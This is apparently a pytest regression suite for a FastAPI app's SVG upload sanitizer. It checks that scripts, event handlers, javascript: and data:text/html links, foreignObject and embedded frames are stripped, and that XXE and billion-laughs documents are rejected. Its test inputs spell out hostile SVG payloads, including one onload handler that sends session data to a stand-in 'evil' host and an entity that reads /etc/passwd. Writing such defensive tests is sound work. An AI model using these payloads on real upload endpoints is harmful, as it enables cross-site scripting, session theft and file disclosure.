"""Regression tests for /review P1-5 — SVG upload sanitization.

The upload allowlist accepts `.svg`. Without sanitization, an SVG can carry
inline <script>, on* event handlers, javascript: hrefs, and <foreignObject>
content — i.e. arbitrary code execution if any future code path serves the
file with image/svg+xml + inline disposition (the current path is safe
because it returns application/octet-stream + attachment, but that's a thin
defense). We sanitize at the gate so the on-disk file is always safe.
"""
import pytest
from fastapi import HTTPException

from app.api.routes.map import _sanitize_svg


def _has(s: bytes, needle: str) -> bool:
    return needle.encode() in s


# ─── Happy path ─────────────────────────────────────────────────────────


def test_sanitize_passes_clean_svg():
    svg = (
        b'<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" '
        b'width="10" height="10"><rect x="0" y="0" width="10" height="10" '
        b'fill="red"/></svg>'
    )
    out = _sanitize_svg(svg)
    assert _has(out, "rect")
    assert _has(out, "fill")


def test_sanitize_preserves_data_image_href():
    """data:image/* URIs are legitimate (embedded raster) and must survive."""
    svg = (
        b'<svg xmlns="http://www.w3.org/2000/svg" '
        b'xmlns:xlink="http://www.w3.org/1999/xlink">'
        b'<image href="data:image/png;base64,iVBORw0KGgoAAAA" '
        b'width="10" height="10"/></svg>'
    )
    out = _sanitize_svg(svg)
    assert _has(out, "data:image/png;base64")


# ─── Dangerous-element stripping ─────────────────────────────────────────


def test_sanitize_strips_script_tag():
    svg = (
        b'<svg xmlns="http://www.w3.org/2000/svg">'
        b'<script>alert(1)</script>'
        b'<rect width="10" height="10"/></svg>'
    )
    out = _sanitize_svg(svg)
    assert b"script" not in out.lower()
    assert b"alert(1)" not in out
    assert _has(out, "rect")  # legitimate sibling survives


def test_sanitize_strips_foreignobject():
    """<foreignObject> can embed HTML which then runs scripts."""
    svg = (
        b'<svg xmlns="http://www.w3.org/2000/svg">'
        b'<foreignObject><body>evil</body></foreignObject>'
        b'<circle r="5"/></svg>'
    )
    out = _sanitize_svg(svg)
    # ElementTree lowercases the tag name on parse but defusedxml/ET preserves case;
    # check both possibilities defensively
    assert b"foreignObject" not in out and b"foreignobject" not in out
    assert b"<body>" not in out
    assert _has(out, "circle")


def test_sanitize_strips_iframe_embed_object():
    svg = (
        b'<svg xmlns="http://www.w3.org/2000/svg">'
        b'<iframe src="http://evil"/><embed src="http://evil"/>'
        b'<object data="http://evil"/><rect/></svg>'
    )
    out = _sanitize_svg(svg)
    assert b"iframe" not in out
    assert b"embed" not in out
    assert b"<object" not in out
    assert _has(out, "rect")


# ─── Attribute stripping ─────────────────────────────────────────────────


def test_sanitize_strips_on_event_handlers():
    """on* attributes (onclick / onload / onmouseover / etc) execute JS."""
    svg = (
        b'<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">'
        b'<rect onclick="steal()" onmouseover="bad()" width="10" height="10"/>'
        b'</svg>'
    )
    out = _sanitize_svg(svg)
    assert b"onload" not in out.lower()
    assert b"onclick" not in out.lower()
    assert b"onmouseover" not in out.lower()
    assert b"alert(1)" not in out
    assert b"steal()" not in out


def test_sanitize_strips_javascript_href():
    """href="javascript:..." would run JS on click."""
    svg = (
        b'<svg xmlns="http://www.w3.org/2000/svg" '
        b'xmlns:xlink="http://www.w3.org/1999/xlink">'
        b'<a href="javascript:alert(1)"><rect/></a>'
        b'<a xlink:href="javascript:bad()"><circle/></a>'
        b'</svg>'
    )
    out = _sanitize_svg(svg)
    assert b"javascript:" not in out.lower()
    # Children survive — only the dangerous attribute is removed
    assert _has(out, "rect") and _has(out, "circle")


def test_sanitize_strips_data_text_href():
    """data:text/html bypasses the data:image/* allowance.
    Real attacker would use base64 to avoid XML-breaking `<`/`>`.
    """
    svg = (
        b'<svg xmlns="http://www.w3.org/2000/svg">'
        # base64 of <script>alert(1)</script>
        b'<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="><rect/></a>'
        b'</svg>'
    )
    out = _sanitize_svg(svg)
    assert b"data:text" not in out.lower()
    # rect must survive
    assert b"rect" in out


# ─── Rejection: malformed / wrong root / XXE ─────────────────────────────


def test_sanitize_rejects_non_svg_root():
    svg = b'<html><body>not an svg</body></html>'
    with pytest.raises(HTTPException) as exc:
        _sanitize_svg(svg)
    assert exc.value.status_code == 400
    assert "svg" in exc.value.detail.lower()


def test_sanitize_rejects_malformed_xml():
    svg = b'<svg><not closed'
    with pytest.raises(HTTPException) as exc:
        _sanitize_svg(svg)
    assert exc.value.status_code == 400


def test_sanitize_rejects_xxe_external_entity():
    """defusedxml must reject DOCTYPE declarations (XXE / billion-laughs)."""
    svg = (
        b'<?xml version="1.0"?>'
        b'<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        b'<svg xmlns="http://www.w3.org/2000/svg">&xxe;</svg>'
    )
    with pytest.raises(HTTPException) as exc:
        _sanitize_svg(svg)
    assert exc.value.status_code == 400


def test_sanitize_rejects_billion_laughs():
    """Recursive entities must be rejected at parse time."""
    svg = (
        b'<?xml version="1.0"?>'
        b'<!DOCTYPE svg ['
        b'<!ENTITY a "aa">'
        b'<!ENTITY b "&a;&a;">'
        b']>'
        b'<svg xmlns="http://www.w3.org/2000/svg">&b;</svg>'
    )
    with pytest.raises(HTTPException) as exc:
        _sanitize_svg(svg)
    assert exc.value.status_code == 400


# ─── End-to-end: realistic injection payload ─────────────────────────────


def test_sanitize_realistic_attack_payload():
    """Combine multiple attack vectors in one SVG. All must be neutralized;
    the legitimate <rect> and <circle> must survive."""
    svg = (
        b'<svg xmlns="http://www.w3.org/2000/svg" '
        b'xmlns:xlink="http://www.w3.org/1999/xlink" '
        b'onload="fetch(\'/api/v1/session\').then(r=>r.text()).then(t=>fetch(\'http://evil/\'+t))">'
        b'<script>document.cookie="stolen"</script>'
        b'<foreignObject><div onclick="bad()">hi</div></foreignObject>'
        b'<a href="javascript:alert(document.cookie)"><rect width="10" height="10"/></a>'
        b'<image xlink:href="data:text/html;base64,YmFkKCk=" width="10" height="10"/>'
        b'<circle r="5" onmouseover="exfil()"/>'
        b'</svg>'
    )
    out = _sanitize_svg(svg)

    # Every attack vector neutralized
    assert b"onload" not in out.lower()
    assert b"script" not in out.lower()
    assert b"foreign" not in out.lower()
    assert b"javascript:" not in out.lower()
    assert b"data:text" not in out.lower()
    assert b"onmouseover" not in out.lower()
    assert b"onclick" not in out.lower()
    assert b"document.cookie" not in out
    assert b"exfil()" not in out
    assert b"bad()" not in out
    assert b"alert(" not in out

    # Legitimate content survives
    assert _has(out, "rect")
    assert _has(out, "circle")
